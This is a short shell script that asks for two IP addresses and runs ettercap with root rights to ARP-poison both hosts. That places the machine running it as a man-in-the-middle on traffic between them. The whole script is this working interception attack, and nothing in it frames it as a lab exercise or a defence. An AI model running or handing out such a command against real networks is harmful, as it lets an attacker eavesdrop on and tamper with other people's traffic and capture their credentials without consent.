read -p "Enter the remote IP address: " remote
read -p "Enter the target IP address: " target

sudo ettercap -T -S -i enx00e04c534458 -M arp:remote /$remote// /$target//

